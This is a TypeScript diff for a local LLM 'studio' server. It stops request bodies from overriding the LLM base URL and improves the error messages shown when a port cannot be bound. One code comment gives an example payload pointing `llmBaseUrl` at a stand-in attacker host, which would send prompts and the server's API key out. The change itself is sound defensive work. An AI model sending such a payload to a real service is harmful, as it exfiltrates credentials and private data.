@@ -82,10 +82,19 @@ interface Ctx {
   stateDirWork: string;
 }
 
-/** The per-job tunable LLM settings. `llmApiKey` is deliberately absent — see rejectSecrets. */
+/**
+ * The per-job tunable LLM settings.
+ *
+ * Two are deliberately absent. `llmApiKey` is a secret and never travels over
+ * HTTP (see `rejectSecrets`). `llmBaseUrl` is worse than a secret: letting a
+ * request body choose the endpoint means `{"llmBaseUrl":"http://attacker/v1"}`
+ * sends every prompt — file paths, source excerpts, the prose being written —
+ * to that host, carrying the SERVER's `OPENAI_API_KEY` in the Authorization
+ * header. Rejecting the key coming in is pointless if the key can be pointed
+ * out. The endpoint is a launch decision, made by whoever started studio.
+ */
 const LLM_OVERRIDE_KEYS = [
   'llmModel',
-  'llmBaseUrl',
   'llmMaxTokens',
   'llmTimeout',
   'llmMaxRetries',
@@ -108,6 +117,14 @@ function rejectSecrets(body: Record<string, unknown>): void {
   if ('llmApiKey' in body || 'OPENAI_API_KEY' in body) {
     throw new Error(
       'llmApiKey is environment-only — set OPENAI_API_KEY where studio runs; it is never accepted over HTTP',
+    );
+  }
+  // Not a secret itself, but it decides where the secret is SENT. A body that
+  // sets it redirects every prompt, and the server's Authorization header, to
+  // a host of the caller's choosing.
+  if ('llmBaseUrl' in body || 'OPENAI_BASE_URL' in body) {
+    throw new Error(
+      'llmBaseUrl is fixed at launch — it decides where prompts and the API key are sent, so a request cannot change it',
     );
   }
 }
@@ -1595,7 +1612,43 @@ export function startStudio(options: StudioOptions): Promise<Server> {
   const port = options.port ?? (settingByKey('port')?.default as number);
   const host = options.host ?? (settingByKey('host')?.default as string);
   return new Promise((resolvePromise, reject) => {
-    server.once('error', reject);
+    server.once('error', (error: NodeJS.ErrnoException) => {
+      // A bare `listen EADDRINUSE: address already in use 127.0.0.1:4860` tells
+      // a reader what happened and nothing about what to do. Both of these are
+      // routine — a second studio, or a port a corporate tool has claimed — so
+      // they name the way out.
+      if (error.code === 'EADDRINUSE') {
+        reject(
+          new Error(
+            `port ${port} on ${host} is already in use — pass --port <n> for a specific port, ` +
+              `or --port 0 to take any free one (the URL is printed once it is bound)`,
+          ),
+        );
+        return;
+      }
+      if (error.code === 'EACCES') {
+        reject(
+          new Error(
+            `not allowed to bind port ${port} on ${host}` +
+              (port < 1024 ? ' — ports below 1024 need elevated privileges; pass --port <n> above 1023' : ''),
+          ),
+        );
+        return;
+      }
+      reject(error);
+    });
     server.listen(port, host, () => resolvePromise(server));
   });
+}
+
+/**
+ * The port a listening server actually bound.
+ *
+ * With `--port 0` the OS chooses, so the number the caller asked for is not the
+ * number to print. Anything that tells a user where to browse must read it from
+ * the socket rather than echoing the request.
+ */
+export function boundPort(server: Server): number {
+  const address = server.address();
+  return typeof address === 'object' && address !== null ? address.port : 0;
 }
